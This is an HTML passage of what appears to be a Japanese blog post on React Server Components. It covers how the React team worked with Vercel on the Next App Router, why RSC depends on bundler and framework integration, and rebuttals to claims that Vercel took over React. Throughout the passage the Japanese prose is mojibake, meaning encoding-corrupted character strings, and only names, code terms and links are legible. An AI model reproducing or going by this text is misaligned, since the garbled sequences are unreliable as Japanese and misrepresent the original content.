<p>Reactãƒãƒ¼ãƒ ã¯ã€Metaã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‹ã‚‰ã®ã‚µãƒ¼ãƒãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã‚„ã€JSãƒãƒ³ãƒ‰ãƒ«ã®è‡ªå‹•åˆ†å‰²ã¨ã‚³ãƒ¼ãƒ‰ã®é…å»¶èª­ã¿è¾¼ã¿ã®çµŒé¨“ãŒã‚ã‚Šã¾ã—ãŸã€‚ã—ã‹ã—ã€ä»¥å‰ã®Reactã®æ©Ÿèƒ½é–‹ç™ºã¨ã¯ç•°ãªã‚Šã€Metaå†…éƒ¨ã§RSCã‚’ã‚¤ãƒ†ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã—ã¦å‡ºè·ã™ã‚‹ãŸã‚ã®é¸æŠè‚¢ã¯é™ã‚‰ã‚Œã¦ã„ã¾ã—ãŸã€‚Metaã®æ—¢å­˜ã®ã‚µãƒ¼ãƒãƒ¼ã‚¤ãƒ³ãƒ•ãƒ©ã¨æŠ€è¡“ã¯ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ä»–ã®äººã€…ãŒå®Ÿéš›ã«ä½¿ç”¨ã—ã¦æ©æµã‚’å—ã‘ã‚‰ã‚Œã‚‹ã‚ˆã†ãªæ–¹æ³•ã§RSCã‚’å®Œå…¨ã«è¨­è¨ˆã™ã‚‹ã“ã¨ã‚’å›°é›£ã«ã—ã¦ã„ã¾ã—ãŸã€‚</p>
<p>æ³¨ç›®ã™ã¹ãã¯ã€React Server Componentsã¯ã€å°†æ¥Reactã‚¢ãƒ—ãƒªã‚’è¨˜è¿°ã™ã‚‹æ–¹æ³•ã«é–¢ã™ã‚‹Reactãƒãƒ¼ãƒ ã®ãƒ“ã‚¸ãƒ§ãƒ³ã§ã‚ã£ãŸã“ã¨ã§ã™ã€‚ç§ã®çŸ¥ã‚‹é™ã‚Šã€ã“ã‚Œã¯Metaã‚„VercelãŒè€ƒæ¡ˆã—ãŸã‚Šã€Reactãƒãƒ¼ãƒ ã«æ§‹ç¯‰ã‚’å¼·è¦ã—ãŸã‚Šã—ãŸã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>é•·å¹´ã«ã‚ãŸã‚Šã€ã€ŒReactã®é–‹ç™ºã¯å…¨ã¦Metaã®å¾“æ¥­å“¡ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¦ã„ã‚‹ã€ã¨ã„ã†æ–­ç¶šçš„ãªè­°è«–ã‚„ä¸æº€ãŒã‚ã‚Šã€ã€Œã€Reactè²¡å›£ã€ã®ã‚ˆã†ãªã‚‚ã®ã‚„ã€Metaã®å¤–éƒ¨ã®äººã€…ãŒç›´æ¥Reactã«å–ã‚Šçµ„ã‚“ã§ã„ã‚Œã°ã„ã„ã®ã«ã€ã¨ã„ã†ã‚³ãƒ¡ãƒ³ãƒˆãŒæ™‚æŠ˜ã‚ã‚Šã¾ã—ãŸã€‚é–¢ä¿‚ã™ã‚‹å®Ÿéš›ã®è­°è«–ã¯çŸ¥ã‚Šã¾ã›ã‚“ãŒã€å¤–éƒ¨ã‹ã‚‰ã®ç§ã®ç†è§£ã§ã¯ã€Reactãƒãƒ¼ãƒ ãŒVercelã«ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã—ã€RSCã®ãƒ“ã‚¸ãƒ§ãƒ³ã‚’ææ¡ˆã—ã€VercelãŒRSCãŒé–‹ç™ºã•ã‚Œã‚‹æ–°ã—ã„å®Ÿé¨“å ´ã¨ãªã‚‹ã“ã¨ã«åŒæ„ã—ãŸã€ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€Sebastian Markbageï¼ˆãã—ã¦å¾Œã«Andrew Clarkï¼‰ãŒMetaã‹ã‚‰Vercelã«ç§»ã‚Šã€Nextãƒãƒ¼ãƒ ã¯RSCã®æœ€åˆã®å®Ÿç”¨çš„ãªå®Ÿè£…ã¨ã—ã¦Next App Routerã‚’è¨­è¨ˆãƒ»æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«è†¨å¤§ãªæ™‚é–“ã€è³‡é‡‘ã€ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã®åŠ´åŠ›ã‚’è²»ã‚„ã—ã¾ã—ãŸã€‚
<a href="https://www.reddit.com/r/reactjs/comments/1kg3yqh/rsc_for_astro_developers_overreacted/mr2bl62/">Dan AbramovãŒèª¬æ˜ã—ãŸ</a>ã‚ˆã†ã«ï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Vercelãƒãƒ¼ãƒ ã¯ã€Reactãƒãƒ¼ãƒ ãŒæœ›ã‚“ã§ã„ãŸã“ã¨ã‚’å®Ÿè£…ã™ã‚‹ãŸã‚ã«ã€ä½•äººã‚‚ã®ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã‚’ä½•å¹´ã‚‚ç¨¼åƒã•ã›ã¦ãã¾ã—ãŸã€‚ã¾ãŸã€Reactãƒãƒ¼ãƒ ã‹ã‚‰æŠ€è¡“çš„ãªæ–¹å‘æ€§ã‚’ç›´æ¥å—ã‘å…¥ã‚ŒãŸã“ã¨ã‚‚äº‹å®Ÿã§ã™ã€‚Next.jsã¯å¤šã‹ã‚Œå°‘ãªã‹ã‚Œã‚¼ãƒ­ã‹ã‚‰æ›¸ãç›´ã•ã‚Œã¾ã—ãŸã€‚
ç¾åœ¨Next.jsã‚’è¨­è¨ˆã—ã¦ã„ã‚‹äººç‰©ã¯ã€Reactãƒ•ãƒƒã‚¯ã‚’ç™ºæ˜ã—ãŸäººç‰©ã§ã™ã€‚ã§ã™ã‹ã‚‰ã€ã©ã¡ã‚‰ã‹ã¨è¨€ãˆã°ã€Reactãƒãƒ¼ãƒ ãŒNext.jsã®æ–¹å‘æ€§ã‚’ã€Œå¼•ãç¶™ã„ã ã€ã‚±ãƒ¼ã‚¹ã§ã‚ã‚Šã€ã€Œã²ã„ãã«ã—ãŸã€ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p></div></div>
<p>ãã®ãƒ—ãƒ­ã‚»ã‚¹ã«ä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚„ä¼æ¥­ã‚’é–¢ä¸ã•ã›ã‚ˆã†ã¨ã™ã‚‹åŠªåŠ›ã¯ã‚ã‚Šã¾ã—ãŸã€‚Shopifyã®Hydrogenãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯RSCã®éå¸¸ã«åˆæœŸã®ãƒ†ã‚¹ãƒˆã¨ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã‚’è¡Œã„ã¾ã—ãŸãŒã€æœ€çµ‚çš„ã«å½¼ã‚‰ã«ã¨ã£ã¦ã¯åˆã‚ãªã„ã¨çµè«–ä»˜ã‘ã¾ã—ãŸã€‚Remixãƒãƒ¼ãƒ ã¯ä½•åº¦ã‹é–¢ä¸ã‚’æ‰“è¨ºã•ã‚Œã¾ã—ãŸãŒã€å½“åˆã¯ç‹¬è‡ªã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«é›†ä¸­ã™ã‚‹ã“ã¨ã‚’é¸æŠã—ã¾ã—ãŸã€‚</p>
<p>ãã®çµæœã€Nextã¯æœ€åˆã®ï¼ˆãã—ã¦äº‹å®Ÿä¸Šä»Šã§ã‚‚å”¯ä¸€ã®ï¼‰ã€Œæœ¬ç•ªç’°å¢ƒå¯¾å¿œã€ã®RSCå®Ÿè£…ã¨ãªã‚Šã¾ã—ãŸã€‚ä»Šæ—¥ã€ä»–ã®ã„ãã¤ã‹ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼ˆParcelã€React Routerã€Wakuã‚’å«ã‚€ï¼‰ãŒRSCçµ±åˆã«å–ã‚Šçµ„ã‚“ã§ã„ã¾ã™ãŒã€Nextã®App RouterãŒç¾åœ¨RSCã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã®å”¯ä¸€ã®åºƒç¯„ãªé¸æŠè‚¢ã§ã™ã€‚</p>
<h3>RSCã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ãƒãƒ³ãƒ‰ãƒ©</h3>
<p>ã€ŒãªãœRSCã¯ãƒãƒ³ãƒ‰ãƒ©ã‚„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’å¿…è¦ã¨ã™ã‚‹ã®ã§ã™ã‹ï¼ŸãªãœReactã«çµ„ã¿è¾¼ã‚€ã ã‘ã§ã¯ã ã‚ãªã®ã§ã™ã‹ï¼Ÿã€ã¨ã„ã£ãŸè³ªå•ã‚’ã‚ˆãç›®ã«ã—ã¾ã™ã€‚</p>
<p>Reactã®æ—¢å­˜ã®ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãƒ¡ã‚½ãƒƒãƒ‰ã€ä¾‹ãˆã°<code class="language-text">renderToString</code>ã‚„<code class="language-text">renderToPipeableStream</code>ã¯ã€Expressã®ãƒ«ãƒ¼ãƒˆãƒãƒ³ãƒ‰ãƒ©ãªã©ã€ã©ã“ã§ã‚‚å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ã—ã‹ã—ã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£çš„ã«RSCã¯ãšã£ã¨è¤‡é›‘ã§ã™ã€‚RSCã®æ©Ÿèƒ½ã¯ã€<code class="language-text">'use client'</code>ã¨<code class="language-text">'use server'</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’æ¢ã™ãŸã‚ã«ã‚³ãƒ¼ãƒ‰ã‚’è§£æã—ã€ãã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›ã—ã¦RSCã®ã‚³ã‚¢æ©Ÿèƒ½ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–¢æ•°ã‚’ç™»éŒ²ã™ã‚‹ãŸã‚ã®é©åˆ‡ãªå‘¼ã³å‡ºã—ã‚’æŒ¿å…¥ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ãƒãƒ³ãƒ‰ãƒ©ã¨ã®ç·Šå¯†ãªçµ±åˆãŒå¿…è¦ã§ã€ãã‚Œã«ã‚ˆã£ã¦ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ä¸¡æ–¹ã®å…¨ã¦ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚°ãƒ©ãƒ•ã‚’æ­£ã—ãæ±ºå®šã—ã€é©åˆ‡ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã•ã‚‰ã«ã€Reactã‚³ã‚¢ãŒå®Ÿéš›ã®RSCæ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–“ã§é€ä¿¡ã™ã‚‹ãŸã‚ã®ãƒ—ãƒªãƒŸãƒ†ã‚£ãƒ–ã‚’æä¾›ã—ã¾ã™ãŒã€ãã‚Œã‚‰ã®ãƒ—ãƒªãƒŸãƒ†ã‚£ãƒ–ã‚’å®Ÿéš›ã«å‘¼ã³å‡ºã—ã€é©åˆ‡ãªå ´æ‰€ã§ä½¿ç”¨ã™ã‚‹ã®ã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯æ¬¡ç¬¬ã§ã™ã€‚ã“ã‚Œã¯ä¸»ã«ãƒ«ãƒ¼ã‚¿ãƒ¼ã¨ã®çµ±åˆã«é–¢ã‚ã‚‹ã“ã¨ã§ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¢ãƒ—ãƒªãŒé©åˆ‡ãªé…å»¶èª­ã¿è¾¼ã¿ã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å—ã‘å–ã‚Šã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¨ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚€é©åˆ‡ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å‘¼ã³å‡ºã™ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã§ã™ã€‚</p>
<p>ã“ã‚Œã¯ã¾ãŸã€å„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®RSCã®ä½¿ç”¨ã¨å®Ÿè£…ãŒç•°ãªã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚Nextã¯App Routerã§ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã¨ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã«éå¸¸ã«å…·ä½“çš„ãªå®Ÿè£…æ±ºå®šã‚’è¡Œã„ã¾ã—ãŸã€‚Wakuã€Parcelã€React Routerã®ã‚ˆã†ãªä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚„ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã¯ã€ã™ã§ã«ã„ãã¤ã‹ã®éå¸¸ã«ç•°ãªã‚‹è¨­è¨ˆæ±ºå®šã‚’è¡Œã£ã¦ã„ã¾ã™ã€‚</p>
<p>å…¨ä½“ã¨ã—ã¦ã€RSCã¯çã—ã„ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰æ©Ÿèƒ½ã§ã™ã€‚ä¸»è¦ãªæ©Ÿèƒ½ã¯Reactã‚³ã‚¢ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã«ç›´æ¥çµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã¾ã™ãŒã€ãã®æ©Ÿèƒ½ã¯ãƒãƒ³ãƒ‰ãƒ©ï¼ãƒ«ãƒ¼ã‚¿ãƒ¼ï¼ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½•ã‚‰ã‹ã®çµ„ã¿åˆã‚ã›ã«çµ±åˆã•ã‚Œã‚‹ã¾ã§ä½¿ç”¨ã§ãã¾ã›ã‚“ã€‚</p>
<h2>ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®æ‡¸å¿µã¨æ··ä¹±</h2>
<p>ã“ã‚Œã‚‰å…¨ã¦ã®æ­´å²ã¨æ–‡è„ˆã‚’å¿µé ­ã«ç½®ã„ã¦ã€é »ç¹ã«ç¹°ã‚Šè¿”ã•ã‚Œã‚‹ã„ãã¤ã‹ã®æ‡¸å¿µäº‹é …ï¼ˆæ··ä¹±ã—ã¦ã„ã‚‹ã‹ã€FUDã§ã‚ã‚‹ã‹ã€ã‚ã‚‹ã„ã¯å®Œå…¨ãªé™°è¬€è«–ã§ã‚ã‚‹ã‹ï¼‰ã«ç­”ãˆã¦ã„ãã¾ã—ã‚‡ã†ï¼ˆãã—ã¦ã€ã†ã¾ãã„ã‘ã°æ˜ç¢ºã«ã—ã€æ‰•æ‹­ã—ã¦ã„ããŸã„ã§ã™ï¼‰ã€‚</p>
<h3>æ‡¸å¿µï¼šVercelã€Nextã€ãã—ã¦React</h3>
<p>ã€ŒVercelãŒReactã®é–‹ç™ºã‚’ä¸»å°ã—ã¦ãŠã‚Šã€ãã®ç›®çš„ã¯ã‚µã‚¤ãƒˆã‚’ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã—ã¦ã‚ˆã‚Šå¤šãã®åç›Šã‚’ä¸Šã’ã‚‹ã“ã¨ã ã€ã¨ã„ã†è¦‹è§£ãŒã€ä»Šã‚„éå¸¸ã«ä¸€èˆ¬çš„ã«ãªã£ã¦ã„ã¾ã™ã€‚ä¸€ä¾‹ã¨ã—ã¦ã€ã“ã‚Œã¯ä»Šå¹´ã®åˆã‚ã«ã‚ã£ãŸRedditã®ã‚¹ãƒ¬ãƒƒãƒ‰ã§æœ€ã‚‚å¤šãæ”¯æŒã•ã‚ŒãŸã‚³ãƒ¡ãƒ³ãƒˆã§ã™ï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>"Vercelã¯äº‹å®Ÿä¸ŠReactã‚’ä¹—ã£å–ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’NextJSã«èª˜å°ã—ã€Vercelã§ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã›ã‚‹ã“ã¨ã§ã€Vercelã®æ ªä¸»ã‚’ã‚ˆã‚Šè±Šã‹ã«ã™ã‚‹ã“ã¨ã«ä¸»ãªé–¢å¿ƒã‚’æŒã£ã¦ã„ã‚‹ã€‚" <a href="https://www.reddit.com/r/react/comments/1iarj85/xbluesky_react_recently_feels_biased_against_vite/m9cb51h/">https://www.reddit.com/r/react/comments/1iarj85/xbluesky_react_recently_feels_biased_against_vite/m9cb51h/</a></p></div></div>
<p>ã“ã‚Œã¯ã€ä»–ã®ã„ãã¤ã‹ã®é–¢é€£ã™ã‚‹æ‡¸å¿µç‚¹ã¨çµã³ã¤ã„ã¦ã„ã¾ã™ï¼š</p>
<ul>
<li>Nextã¯Reactã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§æœ€åˆã«æ¨å¥¨ã•ã‚Œã¦ãŠã‚Šã€Next App Routerã‚‚ã€ŒReactãƒãƒ¼ãƒ ã®ãƒ•ãƒ«ã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ãƒ“ã‚¸ãƒ§ãƒ³ã‚’æ§‹æˆã™ã‚‹æ©Ÿèƒ½ã¯ä½•ã‹ï¼Ÿã€ã®ä¸‹ã§ä¸»ãªä¾‹ã¨ã—ã¦è¨€åŠã•ã‚Œã¦ã„ã‚‹</li>
<li>Nextã¯ä¾ç„¶ã¨ã—ã¦RSCã®å”¯ä¸€ã®æœ¬ç•ªå®Ÿè£…ã§ã‚ã‚‹</li>
<li>Reactãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯<a href="https://x.com/acdlite/status/1549853625673023488">ã€Œã“ã®Nextã®ãƒªãƒªãƒ¼ã‚¹ãŒæœ¬å½“ã®React 18ã ã€</a>ã¨è¿°ã¹ãŸã¨å¼•ç”¨ã•ã‚Œã¦ã„ã‚‹</li>
</ul>
<p>äººã€…ãŒã“ã®çµè«–ã«è‡³ã‚‹ç†ç”±ã¯ç†è§£ã§ãã¾ã™ã€‚Vercelã¯Reactãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚’ä½•äººã‹é›‡ç”¨ã—ã€å½¼ã‚‰ã¯Reactè‡ªä½“ã¨Nextã®ä¸¡æ–¹ã«å–ã‚Šçµ„ã‚“ã§ã„ã¾ã™ã€‚æ™‚ç³»åˆ—çš„ã«ã¯ã€ã“ã‚Œã¯è‡ªç„¶ã«RSCã®é–‹ç™ºã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½¿ç”¨ã‚’ä¿ƒã™ã¨ã„ã†æ–°ã—ã„ã‚·ãƒ•ãƒˆã¨ä¸€è‡´ã—ã¾ã—ãŸ...ãã—ã¦è¦‹ã¦ãã ã•ã„ã€ãã®ã€Œæ˜ç™½ãªã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã¾ã•ã«Nextã§ã™ï¼ä¸€æ–¹ã€Vercelã¯Nextã‚’Vercelä¸Šã§ç°¡å˜ã«ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¦ãƒ›ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€è«å¤§ãªè³‡é‡‘ã¨åŠ´åŠ›ã‚’æŠ•å…¥ã—ã¦ãã¾ã—ãŸã€‚Nextã‚’ä»–ã®å ´æ‰€ã§ãƒ›ã‚¹ãƒˆã™ã‚‹ã“ã¨ã¯å¯èƒ½ã§ã™ãŒã€æ©Ÿèƒ½ã—ãªã‹ã£ãŸã‚Šã€è¨­å®šãŒé›£ã—ã‹ã£ãŸã‚Šã™ã‚‹æ©Ÿèƒ½ãŒå¸¸ã«ã‚ã‚Šã¾ã—ãŸã€‚</p>
<p>ã¨ã¯ã„ãˆã€ç§ãŒè¦‹ã¦ããŸå…¨ã¦ã®ã“ã¨ã‹ã‚‰ã€ã“ã®è¦‹æ–¹ã¯ä¸€èˆ¬çš„ã«å› æœé–¢ä¿‚ã‚’é€†è»¢ã•ã›ã¦ãŠã‚Šã€ã»ã¨ã‚“ã©ãŒFUDã§ã™ã€‚ã¯ã„ã€ã‚‚ã¡ã‚ã‚“Vercelã¯æœ€çµ‚çš„ã«è‡ªåˆ†ãŸã¡ã«åˆ©ç›Šã‚’ã‚‚ãŸã‚‰ã™ã¨è€ƒãˆã‚‹å–ã‚Šçµ„ã¿ã«æŠ•è³‡ã—ã¦ãã¾ã—ãŸã€‚ã—ã‹ã—ã€å‰è¿°ã®é€šã‚Šã€Sebã¨AndrewãŒVercelã«ç§»ã‚Šã€RSCã®é–‹ç™ºãƒ—ãƒ­ã‚»ã‚¹ã«ã¤ã„ã¦ç§ãŒç›®ã«ã—ãŸå…¨ã¦ã®è¨˜è¿°ã¯ã€ã“ã®ä¸€é€£ã®å¤‰æ›´ã‚’æ¨é€²ã—ãŸã®ã¯Reactãƒãƒ¼ãƒ ã§ã‚ã£ãŸã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚</p>
<p>RSCã¯Reactãƒãƒ¼ãƒ ã®ãƒ“ã‚¸ãƒ§ãƒ³ã§ã—ãŸã€‚Metaã®å†…éƒ¨ã§ã¯åŠ¹æœçš„ã«ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’ä½œæˆã—ã¦ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ããªã‹ã£ãŸãŸã‚ã€åˆã‚ã¦ã€é–‹ç™ºã«æŠ•è³‡ã—ã€è¨­è¨ˆã‚’ç¹°ã‚Šè¿”ã™ãŸã‚ã®ç’°å¢ƒã‚’æä¾›ã™ã‚‹ä»–ã®ã‚¹ãƒãƒ³ã‚µãƒ¼ãŒå¿…è¦ã«ãªã‚Šã¾ã—ãŸã€‚å…·ä½“çš„ãªçµŒç·¯ã¯åˆ†ã‹ã‚Šã¾ã›ã‚“ãŒã€ç§ã®ç†è§£ã§ã¯ã€Reactãƒãƒ¼ãƒ ãŒVercelã‚’èª¬å¾—ã—ã¦Reactãƒãƒ¼ãƒ ã®ãƒ“ã‚¸ãƒ§ãƒ³ã«è³›åŒã•ã›ã€ãã—ã¦ãã®ãƒ“ã‚¸ãƒ§ãƒ³ã«åˆè‡´ã™ã‚‹App Routerã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’è¨­è¨ˆã™ã‚‹ãŸã‚ã«Nextã‚’å†è¨­è¨ˆã™ã‚‹ã“ã¨ã‚’å½¼ã‚‰ã«ä»»ã›ãŸã€ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ç¢ºã‹ã«ã€ã€ŒNextã¯ã“ã‚Œã‚’å¿…è¦ã¨ã—ã¦ã„ã‚‹ã€ã¨ã„ã£ãŸé¡ã®Reactã¸ã®å¤‰æ›´ã¯ã„ãã‚‰ã‹ã‚ã‚Šã¾ã—ãŸã€‚ã‚ã‚‹NextConfsã®å‰å¤œã€é‡è¦ãªNextãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ç™ºè¡¨ãŒã‚ã£ãŸéš›ï¼ˆãŠãã‚‰ã13.4ã§ã®å®‰å®šç‰ˆApp Routerï¼Ÿï¼‰ã€Reactãƒªãƒã‚¸ãƒˆãƒªã§ã„ãã¤ã‹ã®PRãŒãƒãƒ¼ã‚¸ã•ã‚Œã‚‹ã®ã‚’è¦‹ãŸè¨˜æ†¶ãŒã‚ã‚Šã¾ã™ã€‚ã—ã‹ã—ã€ãã®ä½œæ¥­ã‚’è¡Œã£ã¦ã„ãŸã®ã¯ä¾ç„¶ã¨ã—ã¦Reactãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã—ãŸã€‚</p>
<p>ç¾æ™‚ç‚¹ã§ã€Reactãƒãƒ¼ãƒ ã¯åˆ†è£‚ã—ã¦ã„ã¾ã™ã€‚å¤§å¤šæ•°ã¯ã¾ã Metaã«ã„ã¾ã™ãŒã€Vercelã®ãƒ¡ãƒ³ãƒãƒ¼ã¯ã‚³ã‚¢å®Ÿè£…ã®éµã‚’æ¡ã£ã¦ã„ã¾ã™ã€‚ã€ŒReactãƒãƒ¼ãƒ ã®ãƒŸãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã¯ç›¸å¤‰ã‚ã‚‰ãšã ã€ã¨èª­ã‚“ã ã“ã¨ãŒã‚ã‚Šã¾ã™ãŒã€ãã®ã‚ˆã†ã«åˆ†è£‚ã™ã‚‹ã“ã¨ã‹ã‚‰ä½•ã‚‰ã‹ã®è¿½åŠ ã®è¤‡é›‘ã•ãŒç”Ÿã˜ã¦ã„ã¦ã‚‚é©šãã¾ã›ã‚“ã€‚</p>
<p>ã¨ã¯ã„ãˆã€ã€ŒVercelãŒReactã‚’ä¹—ã£å–ã£ãŸã€ã¨ã„ã†ã®ã¯é–“é•ã£ã¦ãŠã‚Šã€ã€ŒReactã‚³ã‚¢ã®ä¸€éƒ¨ãŒVercelã«ç§»ã‚Šã€Vercelã‚’èª¬å¾—ã—ã¦Reactã®ãƒ“ã‚¸ãƒ§ãƒ³ã«åŒèª¿ã•ã›ãŸã€ã¨ã„ã†æ–¹ãŒè¿‘ã„ã¨ç§ã¯è€ƒãˆã¦ã„ã¾ã™ã€‚ã¾ãŸã€ã€ŒVercelã€ãŒReactã®è¨­è¨ˆã‚’ä¸»å°ã—ã¦ã„ã‚‹ã€ã‚ã‚‹ã„ã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨RSCã¸ã®é‡ç‚¹åŒ–ãŒVercelã®åç›Šã‚’ä¸Šã’ã‚‹ã¨ã„ã†ç‰¹å®šã®æ„å›³ã‚’æŒã£ã¦ã„ã‚‹ã¨ã„ã†è¨¼æ‹ ã‚‚è¦‹å½“ãŸã‚Šã¾ã›ã‚“ã€‚</p>
<h2>æ‡¸å¿µï¼šReactã¯Nextã§ã—ã‹å‹•ã‹ãªã„</h2>
<p>ã€ŒReactã¯ä»Šã‚„Nextã§ã—ã‹å‹•ã‹ãªã„ã€ã¨ã€çœŸå‰£ã«ã€ã‚ã‚‹ã„ã¯ä¸æ€è­°ãã†ã«è¨€ã†äººã€…ã®ã‚³ãƒ¡ãƒ³ãƒˆã‚’ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã§ã„ãã¤ã‹è¦‹ã¦ãã¾ã—ãŸã€‚</p>
<p>ã“ã‚Œã¯ç°¡å˜ã«åè«–ã§ãã¾ã™ã€‚<a href="https://react.dev/learn/start-a-new-react-project">ã€Œæ–°ã—ã„Reactãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å§‹ã‚ã‚‹ã€ãƒšãƒ¼ã‚¸</a>ã‚’è¦‹ã‚‹ã ã‘ã§ã‚‚ã€Nextã§ã¯ãªã„ä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚„ã€ã‚„ã‚„æ‚ªåé«˜ã„ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãªã—ã§Reactã‚’ä½¿ãˆã¾ã™ã‹ï¼Ÿã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ãŒè¡¨ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>æ˜ã‚‰ã‹ã«ã€ã“ã‚Œã¯Reactã®ä»•çµ„ã¿ã«é–¢ã™ã‚‹å®Œå…¨ãªèª¤è§£ã§ã™ã€‚</p>
